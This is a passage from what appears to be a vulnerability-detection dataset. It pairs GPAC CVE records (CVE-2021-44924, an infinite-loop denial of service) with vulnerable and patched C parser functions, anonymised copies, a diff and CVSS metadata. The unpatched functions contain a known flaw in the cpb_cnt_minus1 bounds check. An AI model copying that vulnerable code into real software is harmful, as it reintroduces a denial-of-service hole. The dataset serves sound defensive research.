 			tempSize += (u32) a->size;
 		}","{'deleted_lines': [], 'added_lines': ['\t\t\tif (!a) continue;']}",True,The gf_isom_hint_rtp_read function in GPAC 1.0.1 allows attackers to cause a denial of service (Invalid memory address dereference) via a crafted file in the MP4Box command.,5.5,MEDIUM,1,valid,2021-12-10T09:02:48Z,4
CVE-2021-44924,['CWE-835'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,gpac,fixed #1959,e2acb1511d1e69115141ea3080afd1cce6a15497,https://github.com/gpac/gpac/commit/e2acb1511d1e69115141ea3080afd1cce6a15497,src/media_tools/av_parsers.c,avc_parse_hrd_parameters,"static void avc_parse_hrd_parameters(GF_BitStream *bs, AVC_HRD *hrd)
{
int i, cpb_cnt_minus1;
cpb_cnt_minus1 = gf_bs_read_ue_log(bs, ""cpb_cnt_minus1"");
if (cpb_cnt_minus1 > 31)
GF_LOG(GF_LOG_WARNING, GF_LOG_CODING, (""[avc-h264] invalid cpb_cnt_minus1 value: %d (expected in [0;31])\n"", cpb_cnt_minus1));
gf_bs_read_int_log(bs, 4, ""bit_rate_scale"");
gf_bs_read_int_log(bs, 4, ""cpb_size_scale"");
for (i = 0; i <= cpb_cnt_minus1; i++) {
gf_bs_read_ue_log_idx(bs, ""bit_rate_value_minus1"", i);
gf_bs_read_ue_log_idx(bs, ""cpb_size_value_minus1"", i);
gf_bs_read_int_log_idx(bs, 1, ""cbr_flag"", i);
}
gf_bs_read_int_log(bs, 5, ""initial_cpb_removal_delay_length_minus1"");
hrd->cpb_removal_delay_length_minus1 = gf_bs_read_int_log(bs, 5, ""cpb_removal_delay_length_minus1"");
hrd->dpb_output_delay_length_minus1 = gf_bs_read_int_log(bs, 5, ""dpb_output_delay_length_minus1"");
hrd->time_offset_length = gf_bs_read_int_log(bs, 5, ""time_offset_length"");
return;
}","static void avc_parse_hrd_parameters(GF_BitStream *VAR_0, AVC_HRD *VAR_1)
{
int VAR_2, VAR_3;
VAR_3 = gf_bs_read_ue_log(VAR_0, ""cpb_cnt_minus1"");
if (VAR_3 > 31)
GF_LOG(VAR_4, VAR_5, (""[avc-h264] invalid cpb_cnt_minus1 value: %d (expected in [0;31])\n"", VAR_3));
gf_bs_read_int_log(VAR_0, 4, ""bit_rate_scale"");
gf_bs_read_int_log(VAR_0, 4, ""cpb_size_scale"");
for (VAR_2 = 0; VAR_2 <= VAR_3; VAR_2++) {
gf_bs_read_ue_log_idx(VAR_0, ""bit_rate_value_minus1"", VAR_2);
gf_bs_read_ue_log_idx(VAR_0, ""cpb_size_value_minus1"", VAR_2);
gf_bs_read_int_log_idx(VAR_0, 1, ""cbr_flag"", VAR_2);
}
gf_bs_read_int_log(VAR_0, 5, ""initial_cpb_removal_delay_length_minus1"");
VAR_1->cpb_removal_delay_length_minus1 = gf_bs_read_int_log(VAR_0, 5, ""cpb_removal_delay_length_minus1"");
VAR_1->dpb_output_delay_length_minus1 = gf_bs_read_int_log(VAR_0, 5, ""dpb_output_delay_length_minus1"");
VAR_1->time_offset_length = gf_bs_read_int_log(VAR_0, 5, ""time_offset_length"");
return;
}",gpac/e2acb1511d1e69115141ea3080afd1cce6a15497/av_parsers.c/vul/before/1.json,"static s32 avc_parse_hrd_parameters(GF_BitStream *bs, AVC_HRD *hrd)
{
	int i, cpb_cnt_minus1;

	cpb_cnt_minus1 = gf_bs_read_ue_log(bs, ""cpb_cnt_minus1"");
	if (cpb_cnt_minus1 > 31) {
		GF_LOG(GF_LOG_WARNING, GF_LOG_CODING, (""[avc-h264] invalid cpb_cnt_minus1 value: %d (expected in [0;31])\n"", cpb_cnt_minus1));
		return -1;
	}
	gf_bs_read_int_log(bs, 4, ""bit_rate_scale"");
	gf_bs_read_int_log(bs, 4, ""cpb_size_scale"");

	/*for( SchedSelIdx = 0; SchedSelIdx <= cpb_cnt_minus1; SchedSelIdx++ ) {*/
	for (i = 0; i <= cpb_cnt_minus1; i++) {
		gf_bs_read_ue_log_idx(bs, ""bit_rate_value_minus1"", i);
		gf_bs_read_ue_log_idx(bs, ""cpb_size_value_minus1"", i);
		gf_bs_read_int_log_idx(bs, 1, ""cbr_flag"", i);
	}
	gf_bs_read_int_log(bs, 5, ""initial_cpb_removal_delay_length_minus1"");
	hrd->cpb_removal_delay_length_minus1 = gf_bs_read_int_log(bs, 5, ""cpb_removal_delay_length_minus1"");
	hrd->dpb_output_delay_length_minus1 = gf_bs_read_int_log(bs, 5, ""dpb_output_delay_length_minus1"");
	hrd->time_offset_length = gf_bs_read_int_log(bs, 5, ""time_offset_length"");
	return 0;
}","static s32 avc_parse_hrd_parameters(GF_BitStream *VAR_0, AVC_HRD *VAR_1)
{
	int VAR_2, VAR_3;

	VAR_3 = gf_bs_read_ue_log(VAR_0, ""cpb_cnt_minus1"");
	if (VAR_3 > 31) {
		GF_LOG(VAR_4, VAR_5, (""[avc-h264] invalid cpb_cnt_minus1 value: %d (expected in [0;31])\n"", VAR_3));
		return -1;
	}
	gf_bs_read_int_log(VAR_0, 4, ""bit_rate_scale"");
	gf_bs_read_int_log(VAR_0, 4, ""cpb_size_scale"");

	/* COMMENT_0 */
	for (VAR_2 = 0; VAR_2 <= VAR_3; VAR_2++) {
		gf_bs_read_ue_log_idx(VAR_0, ""bit_rate_value_minus1"", VAR_2);
		gf_bs_read_ue_log_idx(VAR_0, ""cpb_size_value_minus1"", VAR_2);
		gf_bs_read_int_log_idx(VAR_0, 1, ""cbr_flag"", VAR_2);
	}
	gf_bs_read_int_log(VAR_0, 5, ""initial_cpb_removal_delay_length_minus1"");
	VAR_1->cpb_removal_delay_length_minus1 = gf_bs_read_int_log(VAR_0, 5, ""cpb_removal_delay_length_minus1"");
	VAR_1->dpb_output_delay_length_minus1 = gf_bs_read_int_log(VAR_0, 5, ""dpb_output_delay_length_minus1"");
	VAR_1->time_offset_length = gf_bs_read_int_log(VAR_0, 5, ""time_offset_length"");
	return 0;
}",gpac/e2acb1511d1e69115141ea3080afd1cce6a15497/av_parsers.c/vul/after/1.json,"--- func_before
+++ func_after
@@ -1,10 +1,12 @@
-static void avc_parse_hrd_parameters(GF_BitStream *bs, AVC_HRD *hrd)
+static s32 avc_parse_hrd_parameters(GF_BitStream *bs, AVC_HRD *hrd)
 {
 	int i, cpb_cnt_minus1;
 
 	cpb_cnt_minus1 = gf_bs_read_ue_log(bs, ""cpb_cnt_minus1"");
-	if (cpb_cnt_minus1 > 31)
+	if (cpb_cnt_minus1 > 31) {
 		GF_LOG(GF_LOG_WARNING, GF_LOG_CODING, (""[avc-h264] invalid cpb_cnt_minus1 value: %d (expected in [0;31])\n"", cpb_cnt_minus1));
+		return -1;
+	}
 	gf_bs_read_int_log(bs, 4, ""bit_rate_scale"");
 	gf_bs_read_int_log(bs, 4, ""cpb_size_scale"");
 
@@ -18,5 +20,5 @@
 	hrd->cpb_removal_delay_length_minus1 = gf_bs_read_int_log(bs, 5, ""cpb_removal_delay_length_minus1"");
 	hrd->dpb_output_delay_length_minus1 = gf_bs_read_int_log(bs, 5, ""dpb_output_delay_length_minus1"");
 	hrd->time_offset_length = gf_bs_read_int_log(bs, 5, ""time_offset_length"");
-	return;
+	return 0;
 }","{'deleted_lines': ['static void avc_parse_hrd_parameters(GF_BitStream *bs, AVC_HRD *hrd)', '\tif (cpb_cnt_minus1 > 31)', '\treturn;'], 'added_lines': ['static s32 avc_parse_hrd_parameters(GF_BitStream *bs, AVC_HRD *hrd)', '\tif (cpb_cnt_minus1 > 31) {', '\t\treturn -1;', '\t}', '\treturn 0;']}",True,"An infinite loop vulnerability exists in gpac 1.1.0 in the gf_log function, which causes a Denial of Service.",5.5,MEDIUM,1,valid,2021-12-10T09:03:11Z,4
CVE-2021-44924,['CWE-835'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,gpac,fixed #1959,e2acb1511d1e69115141ea3080afd1cce6a15497,https://github.com/gpac/gpac/commit/e2acb1511d1e69115141ea3080afd1cce6a15497,src/media_tools/av_parsers.c,gf_avc_read_sps_bs_internal,"static s32 gf_avc_read_sps_bs_internal(GF_BitStream *bs, AVCState *avc, u32 subseq_sps, u32 *vui_flag_pos, u32 nal_hdr)
{
AVC_SPS *sps;
s32 mb_width, mb_height, sps_id = -1;
u32 profile_idc, level_idc, pcomp, i, chroma_format_idc, cl = 0, cr = 0, ct = 0, cb = 0, luma_bd, chroma_bd;
u8 separate_colour_plane_flag = 0;
if (!vui_flag_pos) {
gf_bs_enable_emulation_byte_removal(bs, GF_TRUE);
}
if (!bs) {
return -1;
}
if (!nal_hdr) {
gf_bs_read_int_log(bs, 1, ""forbidden_zero_bit"");
gf_bs_read_int_log(bs, 2, ""nal_ref_idc"");
gf_bs_read_int_log(bs, 5, ""nal_unit_type"");
}
profile_idc = gf_bs_read_int_log(bs, 8, ""profile_idc"");
pcomp = gf_bs_read_int_log(bs, 8, ""profile_compatibility"");
if (pcomp & 0x3)
return -1;
level_idc = gf_bs_read_int_log(bs, 8, ""level_idc"");
sps_id = gf_bs_read_ue_log(bs, ""sps_id"") + GF_SVC_SSPS_ID_SHIFT * subseq_sps;
if ((sps_id < 0) || (sps_id >= 32)) {
return -1;
}
luma_bd = chroma_bd = 0;
sps = &avc->sps[sps_id];
chroma_format_idc = sps->ChromaArrayType = 1;
sps->state |= subseq_sps ? AVC_SUBSPS_PARSED : AVC_SPS_PARSED;
switch (profile_idc) {
case 100:
case 110:
case 122:
case 244:
case 44:
if (pcomp & 0xE0)
return -1;
case 83:
case 86:
case 118:
case 128:
chroma_format_idc = gf_bs_read_ue_log(bs, ""chroma_format_idc"");
sps->ChromaArrayType = chroma_format_idc;
if (chroma_format_idc == 3) {
separate_colour_plane_flag = gf_bs_read_int_log(bs, 1, ""separate_colour_plane_flag"");
if (separate_colour_plane_flag) sps->ChromaArrayType = 0;
}
luma_bd = gf_bs_read_ue_log(bs, ""luma_bit_depth"");
chroma_bd = gf_bs_read_ue_log(bs, ""chroma_bit_depth"");
gf_bs_read_int_log(bs, 1, ""qpprime_y_zero_transform_bypass_flag"");
if (gf_bs_read_int_log(bs, 1, ""seq_scaling_matrix_present_flag"")) {
u32 k;
for (k = 0; k < 8; k++) {
if (gf_bs_read_int_log_idx(bs, 1, ""seq_scaling_list_present_flag"", k)) {
u32 z, last = 8, next = 8;
u32 sl = k < 6 ? 16 : 64;
for (z = 0; z < sl; z++) {
if (next) {
s32 delta = gf_bs_read_se(bs);
next = (last + delta + 256) % 256;
}
last = next ? next : last;
}
}
}
}
break;
}
sps->profile_idc = profile_idc;
sps->level_idc = level_idc;
sps->prof_compat = pcomp;
sps->log2_max_frame_num = gf_bs_read_ue_log(bs, ""log2_max_frame_num"") + 4;
sps->poc_type = gf_bs_read_ue_log(bs, ""poc_type"");
sps->chroma_format = chroma_format_idc;
sps->luma_bit_depth_m8 = luma_bd;
sps->chroma_bit_depth_m8 = chroma_bd;
if (sps->poc_type == 0) {
sps->log2_max_poc_lsb = gf_bs_read_ue_log(bs, ""log2_max_poc_lsb"") + 4;
}
else if (sps->poc_type == 1) {
sps->delta_pic_order_always_zero_flag = gf_bs_read_int_log(bs, 1, ""delta_pic_order_always_zero_flag"");
sps->offset_for_non_ref_pic = gf_bs_read_se_log(bs, ""offset_for_non_ref_pic"");
sps->offset_for_top_to_bottom_field = gf_bs_read_se_log(bs, ""offset_for_top_to_bottom_field"");
sps->poc_cycle_length = gf_bs_read_ue_log(bs, ""poc_cycle_length"");
if (sps->poc_cycle_length > GF_ARRAY_LENGTH(sps->offset_for_ref_frame)) {
sps->poc_cycle_length = 255;
GF_LOG(GF_LOG_ERROR, GF_LOG_CODING, (""[avc-h264] offset_for_ref_frame overflow from poc_cycle_length\n""));
return -1;
}
for (i = 0; i < sps->poc_cycle_length; i++)
sps->offset_for_ref_frame[i] = gf_bs_read_se_log_idx(bs, ""offset_for_ref_frame"", i);
}
if (sps->poc_type > 2) {
return -1;
}
sps->max_num_ref_frames = gf_bs_read_ue_log(bs, ""max_num_ref_frames"");
sps->gaps_in_frame_num_value_allowed_flag = gf_bs_read_int_log(bs, 1, ""gaps_in_frame_num_value_allowed_flag"");
mb_width = gf_bs_read_ue_log(bs, ""pic_width_in_mbs_minus1"") + 1;
mb_height = gf_bs_read_ue_log(bs, ""pic_height_in_map_units_minus1"") + 1;
sps->frame_mbs_only_flag = gf_bs_read_int_log(bs, 1, ""frame_mbs_only_flag"");
sps->width = mb_width * 16;
sps->height = (2 - sps->frame_mbs_only_flag) * mb_height * 16;
if (!sps->frame_mbs_only_flag) sps->mb_adaptive_frame_field_flag = gf_bs_read_int_log(bs, 1, ""mb_adaptive_frame_field_flag"");
gf_bs_read_int_log(bs, 1, ""direct_8x8_inference_flag"");
if (gf_bs_read_int_log(bs, 1, ""frame_cropping_flag"")) {
int CropUnitX, CropUnitY, SubWidthC = -1, SubHeightC = -1;
if (chroma_format_idc == 1) {
SubWidthC = 2; SubHeightC = 2;
}
else if (chroma_format_idc == 2) {
SubWidthC = 2; SubHeightC = 1;
}
else if ((chroma_format_idc == 3) && (separate_colour_plane_flag == 0)) {
SubWidthC = 1; SubHeightC = 1;
}
if (sps->ChromaArrayType == 0) {
assert(SubWidthC == -1);
CropUnitX = 1;
CropUnitY = 2 - sps->frame_mbs_only_flag;
}
else {
CropUnitX = SubWidthC;
CropUnitY = SubHeightC * (2 - sps->frame_mbs_only_flag);
}
cl = gf_bs_read_ue_log(bs, ""frame_crop_left_offset"");
cr = gf_bs_read_ue_log(bs, ""frame_crop_right_offset"");
ct = gf_bs_read_ue_log(bs, ""frame_crop_top_offset"");
cb = gf_bs_read_ue_log(bs, ""frame_crop_bottom_offset"");
sps->width -= CropUnitX * (cl + cr);
sps->height -= CropUnitY * (ct + cb);
cl *= CropUnitX;
cr *= CropUnitX;
ct *= CropUnitY;
cb *= CropUnitY;
}
sps->crop.left = cl;
sps->crop.right = cr;
sps->crop.top = ct;
sps->crop.bottom = cb;
if (vui_flag_pos) {
*vui_flag_pos = (u32)gf_bs_get_bit_offset(bs);
}
sps->vui_parameters_present_flag = gf_bs_read_int_log(bs, 1, ""vui_parameters_present_flag"");
if (sps->vui_parameters_present_flag) {
sps->vui.aspect_ratio_info_present_flag = gf_bs_read_int_log(bs, 1, ""aspect_ratio_info_present_flag"");
if (sps->vui.aspect_ratio_info_present_flag) {
s32 aspect_ratio_idc = gf_bs_read_int_log(bs, 8, ""aspect_ratio_idc"");
if (aspect_ratio_idc == 255) {
sps->vui.par_num = gf_bs_read_int_log(bs, 16, ""aspect_ratio_num"");
sps->vui.par_den = gf_bs_read_int_log(bs, 16, ""aspect_ratio_den"");
}
else if (aspect_ratio_idc < GF_ARRAY_LENGTH(avc_hevc_sar) ) {
sps->vui.par_num = avc_hevc_sar[aspect_ratio_idc].w;
sps->vui.par_den = avc_hevc_sar[aspect_ratio_idc].h;
}
else {
GF_LOG(GF_LOG_WARNING, GF_LOG_CODING, (""[avc-h264] Unknown aspect_ratio_idc: your video may have a wrong aspect ratio. Contact the GPAC team!\n""));
}
}
sps->vui.overscan_info_present_flag = gf_bs_read_int_log(bs, 1, ""overscan_info_present_flag"");
if (sps->vui.overscan_info_present_flag)
gf_bs_read_int_log(bs, 1, ""overscan_appropriate_flag"");
sps->vui.video_format = 5;
sps->vui.colour_primaries = 2;
sps->vui.transfer_characteristics = 2;
sps->vui.matrix_coefficients = 2;
sps->vui.video_signal_type_present_flag = gf_bs_read_int_log(bs, 1, ""video_signal_type_present_flag"");
if (sps->vui.video_signal_type_present_flag) {
sps->vui.video_format = gf_bs_read_int_log(bs, 3, ""video_format"");
sps->vui.video_full_range_flag = gf_bs_read_int_log(bs, 1, ""video_full_range_flag"");
sps->vui.colour_description_present_flag = gf_bs_read_int_log(bs, 1, ""colour_description_present_flag"");
if (sps->vui.colour_description_present_flag) {
sps->vui.colour_primaries = gf_bs_read_int_log(bs, 8, ""colour_primaries"");
sps->vui.transfer_characteristics = gf_bs_read_int_log(bs, 8, ""transfer_characteristics"");
sps->vui.matrix_coefficients = gf_bs_read_int_log(bs, 8, ""matrix_coefficients"");
}
}
if (gf_bs_read_int_log(bs, 1, ""chroma_location_info_present_flag"")) {
gf_bs_read_ue_log(bs, ""chroma_sample_location_type_top_field"");
gf_bs_read_ue_log(bs, ""chroma_sample_location_type_bottom_field"");
}
sps->vui.timing_info_present_flag = gf_bs_read_int_log(bs, 1, ""timing_info_present_flag"");
if (sps->vui.timing_info_present_flag) {
sps->vui.num_units_in_tick = gf_bs_read_int_log(bs, 32, ""num_units_in_tick"");
sps->vui.time_scale = gf_bs_read_int_log(bs, 32, ""time_scale"");
sps->vui.fixed_frame_rate_flag = gf_bs_read_int_log(bs, 1, ""fixed_frame_rate_flag"");
}
sps->vui.nal_hrd_parameters_present_flag = gf_bs_read_int_log(bs, 1, ""nal_hrd_parameters_present_flag"");
if (sps->vui.nal_hrd_parameters_present_flag)
avc_parse_hrd_parameters(bs, &sps->vui.hrd);
sps->vui.vcl_hrd_parameters_present_flag = gf_bs_read_int_log(bs, 1, ""vcl_hrd_parameters_present_flag"");
if (sps->vui.vcl_hrd_parameters_present_flag)
avc_parse_hrd_parameters(bs, &sps->vui.hrd);
if (sps->vui.nal_hrd_parameters_present_flag || sps->vui.vcl_hrd_parameters_present_flag)
sps->vui.low_delay_hrd_flag = gf_bs_read_int_log(bs, 1, ""low_delay_hrd_flag"");
sps->vui.pic_struct_present_flag = gf_bs_read_int_log(bs, 1, ""pic_struct_present_flag"");
}
if (subseq_sps) {
if ((profile_idc == 83) || (profile_idc == 86)) {
u8 extended_spatial_scalability_idc;
gf_bs_read_int_log(bs, 1, ""inter_layer_deblocking_filter_control_present_flag"");
extended_spatial_scalability_idc = gf_bs_read_int_log(bs, 2, ""extended_spatial_scalability_idc"");
if (sps->ChromaArrayType == 1 || sps->ChromaArrayType == 2) {
gf_bs_read_int_log(bs, 1, ""chroma_phase_x_plus1_flag"");
}
if (sps->ChromaArrayType == 1) {
gf_bs_read_int_log(bs, 2, ""chroma_phase_y_plus1"");
}
if (extended_spatial_scalability_idc == 1) {
if (sps->ChromaArrayType > 0) {
gf_bs_read_int_log(bs, 1, ""seq_ref_layer_chroma_phase_x_plus1_flag"");
gf_bs_read_int_log(bs, 2, ""seq_ref_layer_chroma_phase_y_plus1"");
}
gf_bs_read_se_log(bs, ""seq_scaled_ref_layer_left_offset"");
gf_bs_read_se_log(bs, ""seq_scaled_ref_layer_top_offset"");
gf_bs_read_se_log(bs, ""seq_scaled_ref_layer_right_offset"");
gf_bs_read_se_log(bs, ""seq_scaled_ref_layer_bottom_offset"");
}
if (gf_bs_read_int_log(bs, 1, ""seq_tcoeff_level_prediction_flag"")) {
gf_bs_read_int_log(bs, 1, ""adaptive_tcoeff_level_prediction_flag"");
}
gf_bs_read_int_log(bs, 1, ""slice_header_restriction_flag"");
if (gf_bs_read_int_log(bs, 1, ""svc_vui_parameters_present"")) {
u32 vui_ext_num_entries_minus1 = gf_bs_read_ue_log(bs, ""vui_ext_num_entries_minus1"");
for (i = 0; i <= vui_ext_num_entries_minus1; i++) {
u8 vui_ext_nal_hrd_parameters_present_flag, vui_ext_vcl_hrd_parameters_present_flag, vui_ext_timing_info_present_flag;
gf_bs_read_int_log(bs, 3, ""vui_ext_dependency_id"");
gf_bs_read_int_log(bs, 4, ""vui_ext_quality_id"");
gf_bs_read_int_log(bs, 3, ""vui_ext_temporal_id"");
vui_ext_timing_info_present_flag = gf_bs_read_int_log(bs, 1, ""vui_ext_timing_info_present_flag"");
if (vui_ext_timing_info_present_flag) {
gf_bs_read_int_log(bs, 32, ""vui_ext_num_units_in_tick"");
gf_bs_read_int_log(bs, 32, ""vui_ext_time_scale"");
gf_bs_read_int_log(bs, 1, ""vui_ext_fixed_frame_rate_flag"");
}
vui_ext_nal_hrd_parameters_present_flag = gf_bs_read_int_log(bs, 1, ""vui_ext_nal_hrd_parameters_present_flag"");
if (vui_ext_nal_hrd_parameters_present_flag) {
}
vui_ext_vcl_hrd_parameters_present_flag = gf_bs_read_int_log(bs, 1, ""vui_ext_vcl_hrd_parameters_present_flag"");
if (vui_ext_vcl_hrd_parameters_present_flag) {
}
if (vui_ext_nal_hrd_parameters_present_flag || vui_ext_vcl_hrd_parameters_present_flag) {
gf_bs_read_int_log(bs, 1, ""vui_ext_low_delay_hrd_flag"");
}
gf_bs_read_int_log(bs, 1, ""vui_ext_pic_struct_present_flag"");
}
}
}
else if ((profile_idc == 118) || (profile_idc == 128)) {
GF_LOG(GF_LOG_INFO, GF_LOG_CODING, (""[avc-h264] MVC parsing not implemented - skipping parsing end of Subset SPS\n""));
return sps_id;
}
if (gf_bs_read_int_log(bs, 1, ""additional_extension2"")) {
GF_LOG(GF_LOG_WARNING, GF_LOG_CODING, (""[avc-h264] skipping parsing end of Subset SPS (additional_extension2)\n""));
return sps_id;
}
}
return sps_id;
}","static s32 gf_avc_read_sps_bs_internal(GF_BitStream *VAR_0, AVCState *VAR_1, u32 VAR_2, u32 *VAR_3, u32 VAR_4)
{
AVC_SPS *VAR_5;
s32 VAR_6, VAR_7, VAR_8 = -1;
u32 VAR_9, VAR_10, VAR_11, VAR_12, VAR_13, VAR_14 = 0, VAR_15 = 0, VAR_16 = 0, VAR_17 = 0, VAR_18, VAR_19;
u8 VAR_20 = 0;
if (!VAR_3) {
gf_bs_enable_emulation_byte_removal(VAR_0, VAR_21);
}
if (!VAR_0) {
return -1;
}
if (!VAR_4) {
gf_bs_read_int_log(VAR_0, 1, ""forbidden_zero_bit"");
gf_bs_read_int_log(VAR_0, 2, ""nal_ref_idc"");
gf_bs_read_int_log(VAR_0, 5, ""nal_unit_type"");
}
VAR_9 = gf_bs_read_int_log(VAR_0, 8, ""profile_idc"");
VAR_11 = gf_bs_read_int_log(VAR_0, 8, ""profile_compatibility"");
if (VAR_11 & 0x3)
return -1;
VAR_10 = gf_bs_read_int_log(VAR_0, 8, ""level_idc"");
VAR_8 = gf_bs_read_ue_log(VAR_0, ""sps_id"") + VAR_22 * VAR_2;
if ((VAR_8 < 0) || (VAR_8 >= 32)) {
return -1;
}
VAR_18 = VAR_19 = 0;
VAR_5 = &VAR_1->sps[VAR_8];
VAR_13 = VAR_5->ChromaArrayType = 1;
VAR_5->state |= VAR_2 ? VAR_23 : VAR_24;
switch (VAR_9) {
case 100:
case 110:
case 122:
case 244:
case 44:
if (VAR_11 & 0xE0)
return -1;
case 83:
case 86:
case 118:
case 128:
VAR_13 = gf_bs_read_ue_log(VAR_0, ""chroma_format_idc"");
VAR_5->ChromaArrayType = VAR_13;
if (VAR_13 == 3) {
VAR_20 = gf_bs_read_int_log(VAR_0, 1, ""separate_colour_plane_flag"");
if (VAR_20) VAR_5->ChromaArrayType = 0;
}
VAR_18 = gf_bs_read_ue_log(VAR_0, ""luma_bit_depth"");
VAR_19 = gf_bs_read_ue_log(VAR_0, ""chroma_bit_depth"");
gf_bs_read_int_log(VAR_0, 1, ""qpprime_y_zero_transform_bypass_flag"");
if (gf_bs_read_int_log(VAR_0, 1, ""seq_scaling_matrix_present_flag"")) {
u32 VAR_25;
for (VAR_25 = 0; VAR_25 < 8; VAR_25++) {
if (gf_bs_read_int_log_idx(VAR_0, 1, ""seq_scaling_list_present_flag"", VAR_25)) {
u32 VAR_26, VAR_27 = 8, VAR_28 = 8;
u32 VAR_29 = VAR_25 < 6 ? 16 : 64;
for (VAR_26 = 0; VAR_26 < VAR_29; VAR_26++) {
if (VAR_28) {
s32 VAR_30 = gf_bs_read_se(VAR_0);
VAR_28 = (VAR_27 + VAR_30 + 256) % 256;
}
VAR_27 = VAR_28 ? VAR_28 : VAR_27;
}
}
}
}
break;
}
VAR_5->profile_idc = VAR_9;
VAR_5->level_idc = VAR_10;
VAR_5->prof_compat = VAR_11;
VAR_5->log2_max_frame_num = gf_bs_read_ue_log(VAR_0, ""log2_max_frame_num"") + 4;
VAR_5->poc_type = gf_bs_read_ue_log(VAR_0, ""poc_type"");
VAR_5->chroma_format = VAR_13;
VAR_5->luma_bit_depth_m8 = VAR_18;
VAR_5->chroma_bit_depth_m8 = VAR_19;
if (VAR_5->poc_type == 0) {
VAR_5->log2_max_poc_lsb = gf_bs_read_ue_log(VAR_0, ""log2_max_poc_lsb"") + 4;
}
else if (VAR_5->poc_type == 1) {
VAR_5->delta_pic_order_always_zero_flag = gf_bs_read_int_log(VAR_0, 1, ""delta_pic_order_always_zero_flag"");
VAR_5->offset_for_non_ref_pic = gf_bs_read_se_log(VAR_0, ""offset_for_non_ref_pic"");
VAR_5->offset_for_top_to_bottom_field = gf_bs_read_se_log(VAR_0, ""offset_for_top_to_bottom_field"");
VAR_5->poc_cycle_length = gf_bs_read_ue_log(VAR_0, ""poc_cycle_length"");
if (VAR_5->poc_cycle_length > GF_ARRAY_LENGTH(VAR_5->offset_for_ref_frame)) {
VAR_5->poc_cycle_length = 255;
GF_LOG(VAR_31, VAR_32, (""[avc-h264] offset_for_ref_frame overflow from poc_cycle_length\n""));
return -1;
}
for (VAR_12 = 0; VAR_12 < VAR_5->poc_cycle_length; VAR_12++)
VAR_5->offset_for_ref_frame[VAR_12] = gf_bs_read_se_log_idx(VAR_0, ""offset_for_ref_frame"", VAR_12);
}
if (VAR_5->poc_type > 2) {
return -1;
}
VAR_5->max_num_ref_frames = gf_bs_read_ue_log(VAR_0, ""max_num_ref_frames"");
VAR_5->gaps_in_frame_num_value_allowed_flag = gf_bs_read_int_log(VAR_0, 1, ""gaps_in_frame_num_value_allowed_flag"");
VAR_6 = gf_bs_read_ue_log(VAR_0, ""pic_width_in_mbs_minus1"") + 1;
VAR_7 = gf_bs_read_ue_log(VAR_0, ""pic_height_in_map_units_minus1"") + 1;
VAR_5->frame_mbs_only_flag = gf_bs_read_int_log(VAR_0, 1, ""frame_mbs_only_flag"");
VAR_5->width = VAR_6 * 16;
VAR_5->height = (2 - VAR_5->frame_mbs_only_flag) * VAR_7 * 16;
if (!VAR_5->frame_mbs_only_flag) VAR_5->mb_adaptive_frame_field_flag = gf_bs_read_int_log(VAR_0, 1, ""mb_adaptive_frame_field_flag"");
gf_bs_read_int_log(VAR_0, 1, ""direct_8x8_inference_flag"");
if (gf_bs_read_int_log(VAR_0, 1, ""frame_cropping_flag"")) {
int VAR_33, VAR_34, VAR_35 = -1, VAR_36 = -1;
if (VAR_13 == 1) {
VAR_35 = 2; VAR_36 = 2;
}
else if (VAR_13 == 2) {
VAR_35 = 2; VAR_36 = 1;
}
else if ((VAR_13 == 3) && (VAR_20 == 0)) {
VAR_35 = 1; VAR_36 = 1;
}
if (VAR_5->ChromaArrayType == 0) {
assert(VAR_35 == -1);
VAR_33 = 1;
VAR_34 = 2 - VAR_5->frame_mbs_only_flag;
}
else {
VAR_33 = VAR_35;
VAR_34 = VAR_36 * (2 - VAR_5->frame_mbs_only_flag);
}
VAR_14 = gf_bs_read_ue_log(VAR_0, ""frame_crop_left_offset"");
VAR_15 = gf_bs_read_ue_log(VAR_0, ""frame_crop_right_offset"");
VAR_16 = gf_bs_read_ue_log(VAR_0, ""frame_crop_top_offset"");
VAR_17 = gf_bs_read_ue_log(VAR_0, ""frame_crop_bottom_offset"");
VAR_5->width -= VAR_33 * (VAR_14 + VAR_15);
VAR_5->height -= VAR_34 * (VAR_16 + VAR_17);
VAR_14 *= VAR_33;
VAR_15 *= VAR_33;
VAR_16 *= VAR_34;
VAR_17 *= VAR_34;
}
VAR_5->crop.left = VAR_14;
VAR_5->crop.right = VAR_15;
VAR_5->crop.top = VAR_16;
VAR_5->crop.bottom = VAR_17;
if (VAR_3) {
*VAR_3 = (u32)gf_bs_get_bit_offset(VAR_0);
}
VAR_5->vui_parameters_present_flag = gf_bs_read_int_log(VAR_0, 1, ""vui_parameters_present_flag"");
if (VAR_5->vui_parameters_present_flag) {
VAR_5->vui.aspect_ratio_info_present_flag = gf_bs_read_int_log(VAR_0, 1, ""aspect_ratio_info_present_flag"");
if (VAR_5->vui.aspect_ratio_info_present_flag) {
s32 VAR_37 = gf_bs_read_int_log(VAR_0, 8, ""aspect_ratio_idc"");
if (VAR_37 == 255) {
VAR_5->vui.par_num = gf_bs_read_int_log(VAR_0, 16, ""aspect_ratio_num"");
VAR_5->vui.par_den = gf_bs_read_int_log(VAR_0, 16, ""aspect_ratio_den"");
}
else if (VAR_37 < GF_ARRAY_LENGTH(VAR_38) ) {
VAR_5->vui.par_num = VAR_38[VAR_37].w;
VAR_5->vui.par_den = VAR_38[VAR_37].h;
}
else {
GF_LOG(VAR_39, VAR_32, (""[avc-h264] Unknown aspect_ratio_idc: your video may have a wrong aspect ratio. Contact the GPAC team!\n""));
}
}
VAR_5->vui.overscan_info_present_flag = gf_bs_read_int_log(VAR_0, 1, ""overscan_info_present_flag"");
if (VAR_5->vui.overscan_info_present_flag)
gf_bs_read_int_log(VAR_0, 1, ""overscan_appropriate_flag"");
VAR_5->vui.video_format = 5;
VAR_5->vui.colour_primaries = 2;
VAR_5->vui.transfer_characteristics = 2;
VAR_5->vui.matrix_coefficients = 2;
VAR_5->vui.video_signal_type_present_flag = gf_bs_read_int_log(VAR_0, 1, ""video_signal_type_present_flag"");
if (VAR_5->vui.video_signal_type_present_flag) {
VAR_5->vui.video_format = gf_bs_read_int_log(VAR_0, 3, ""video_format"");
VAR_5->vui.video_full_range_flag = gf_bs_read_int_log(VAR_0, 1, ""video_full_range_flag"");
VAR_5->vui.colour_description_present_flag = gf_bs_read_int_log(VAR_0, 1, ""colour_description_present_flag"");
if (VAR_5->vui.colour_description_present_flag) {
VAR_5->vui.colour_primaries = gf_bs_read_int_log(VAR_0, 8, ""colour_primaries"");
VAR_5->vui.transfer_characteristics = gf_bs_read_int_log(VAR_0, 8, ""transfer_characteristics"");
